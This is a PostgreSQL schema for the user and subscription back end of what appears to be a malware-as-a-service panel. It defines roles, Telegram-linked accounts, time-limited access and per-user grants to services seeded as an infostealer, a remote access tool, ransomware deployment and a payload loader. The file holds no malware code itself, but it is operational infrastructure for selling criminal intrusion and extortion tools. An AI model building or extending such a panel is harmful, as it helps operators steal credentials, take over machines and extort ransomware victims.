DROP TABLE IF EXISTS users CASCADE;
DROP TYPE IF EXISTS user_role CASCADE;
CREATE TYPE user_role AS ENUM ('SA', 'A', 'ifUser', 'ROP', 'RUser', 'LO');

CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    telegram_id BIGINT UNIQUE,
    telegram_username VARCHAR(50),
    role user_role NOT NULL DEFAULT 'ifUser',
    access_start TIMESTAMPTZ,
    access_end TIMESTAMPTZ,
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    last_login TIMESTAMPTZ,
    registration_completed_at TIMESTAMPTZ
);

ALTER TABLE registration_codes ADD COLUMN role user_role DEFAULT 'ifUser';
ALTER TABLE pending_registrations ADD COLUMN role user_role DEFAULT 'ifUser';

CREATE TABLE IF NOT EXISTS service_types (
    id SERIAL PRIMARY KEY,
    name VARCHAR(50) NOT NULL UNIQUE,
    display_name VARCHAR(100) NOT NULL,
    description TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS user_services (
    user_id INTEGER NOT NULL,
    service_id INTEGER NOT NULL,
    granted_at TIMESTAMPTZ DEFAULT NOW(),
    granted_by INTEGER REFERENCES users(id),
    PRIMARY KEY (user_id, service_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (service_id) REFERENCES service_types(id) ON DELETE CASCADE
);

INSERT INTO service_types (name, display_name, description) VALUES
    ('infostealer', 'InfoStealer', 'Access to InfoStealer data collection and dashboard'),
    ('rat', 'RAT', 'Remote Access Tool control and management'),
    ('ransomware', 'Ransomware', 'Ransomware deployment and monitoring'),
    ('loader', 'Loader', 'Payload loader service access')
ON CONFLICT (name) DO NOTHING;

CREATE OR REPLACE FUNCTION has_service_access(user_id INTEGER, service_name TEXT)
RETURNS BOOLEAN AS $$
DECLARE
    user_role_val user_role;
BEGIN
    SELECT role INTO user_role_val FROM users WHERE id = user_id;
    
    IF user_role_val IN ('SA', 'A') THEN
        RETURN TRUE;
    END IF;
    
    IF user_role_val IN ('ifUser', 'ROP', 'RUser', 'LO') THEN
        RETURN EXISTS (
            SELECT 1 FROM user_services us
            JOIN service_types st ON us.service_id = st.id
            WHERE us.user_id = has_service_access.user_id 
            AND st.name = service_name
        );
    END IF;
    
    RETURN FALSE;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION get_user_services(user_id INTEGER)
RETURNS TABLE(service_name TEXT, display_name TEXT) AS $$
BEGIN
    RETURN QUERY
    SELECT st.name, st.display_name
    FROM user_services us
    JOIN service_types st ON us.service_id = st.id
    WHERE us.user_id = get_user_services.user_id;
END;
$$ LANGUAGE plpgsql;

CREATE VIEW active_users AS
SELECT 
    u.id,
    u.username,
    u.role,
    u.access_start,
    u.access_end,
    u.is_active,
    CASE 
        WHEN u.role IN ('SA', 'A') THEN true
        WHEN u.access_end IS NULL OR u.access_end > NOW() THEN true
        ELSE false
    END as has_active_subscription
FROM users u
WHERE u.is_active = true;

CREATE VIEW user_access_summary AS
SELECT 
    u.id,
    u.username,
    u.role,
    u.is_active,
    u.access_start,
    u.access_end,
    COALESCE(
        array_agg(st.name ORDER BY st.name) FILTER (WHERE st.name IS NOT NULL),
        ARRAY[]::text[]
    ) as services
FROM users u
LEFT JOIN user_services us ON u.id = us.user_id
LEFT JOIN service_types st ON us.service_id = st.id
GROUP BY u.id, u.username, u.role, u.is_active, u.access_start, u.access_end;

CREATE INDEX IF NOT EXISTS idx_user_services_user_id ON user_services(user_id);
CREATE INDEX IF NOT EXISTS idx_user_services_service_id ON user_services(service_id);
CREATE INDEX IF NOT EXISTS idx_service_types_name ON service_types(name); 